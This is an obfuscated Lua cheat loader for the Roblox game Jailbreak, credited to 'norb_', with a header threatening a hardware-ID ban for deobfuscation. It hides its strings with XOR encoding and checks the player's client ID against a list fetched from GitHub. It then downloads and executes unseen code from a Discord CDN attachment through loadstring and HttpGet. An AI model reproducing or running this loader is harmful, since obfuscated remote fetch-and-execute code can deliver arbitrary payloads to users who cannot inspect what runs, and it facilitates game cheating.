--[[
     ____.      .__.__ ___.                        __      ____ ___      .__                                 .__   
    |    |____  |__|  |\_ |_________  ____ _____  |  | __ |    |   \____ |__|__  __ ___________  __________  |  |  
    |    \__  \ |  |  | | __ \_  __ \/ __ \\__  \ |  |/ / |    |   /    \|  \  \/ // __ \_  __ \/  ___|__  \ |  |  
/\__|    |/ __ \|  |  |_| \_\ \  | \|  ___/ / __ \|    <  |    |  /   |  \  |\   /\  ___/|  | \/\___ \ / __ \|  |__
\________(____  /__|____/___  /__|   \___  >____  /__|_ \ |______/|___|  /__| \_/  \___  >__|  /____  >____  /____/
              \/            \/           \/     \/     \/              \/              \/           \/     \/      

Jailbreak Universal loader script by norb_
Deobfuscation attempts will result in a HWID script ban 
]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v12,v13)local v14=1422 -(378 + 1044) ;local v15;while true do if (v14==(2 -1)) then return v5(v15);end if (v14==(0 -0)) then v15={};for v19=1638 -(1523 + 114) , #v12 do v6(v15,v0(v4(v1(v2(v12,v19,v19 + 1 )),v1(v2(v13,(569 -(367 + 201)) + (v19% #v13) ,(1 -0) + (v19% #v13) + (928 -(214 + 713)) )))%(65 + 191) ));end v14=1;end end end local v8=game:GetService(v7("\227\193\195\4\232\186\203\7\197\202\216\54\213\190\213\8\216\192\222","\126\177\163\187\69\134\219\167")):GetClientId();local v9=game:GetService(v7("\19\193\43\220\249\49\222","\156\67\173\74\165"));local v10=loadstring(game:HttpGet("https://raw.githubusercontent.com/"   .. "devnorb/"   .. "jailbreakScripts/main/"   .. v7("\54\187\72\21\183\42\79\39\163\76\18\242\42\83\53","\38\84\215\41\118\220\70") ))();local function v11(v16)for v17,v18 in v10 do if (v16==v18) then v9.LocalPlayer:Kick(v7("\105\25\55\82\246\81\0\39\82\252\85\19\44\82\252\92\23\33\25\242\89\5\54\23\250\16\16\48\29\243\16\2\42\27\237\16\5\33\0\247\64\2\99","\158\48\118\66\114"));elseif (v16~=v18) then loadstring(game:HttpGet("https://cdn.discordapp.com/"   .. "attachments/"   .. v7("\250\117\69\102\43\253\168\254\124\70\111\38\241\172\254\114\65\98\43","\155\203\68\112\86\19\197")   .. "/1160736595729715230/"   .. v7("\75\220\63\242\14\116\240\249","\152\38\189\86\156\32\24\133") ))();end end end v11(v8);
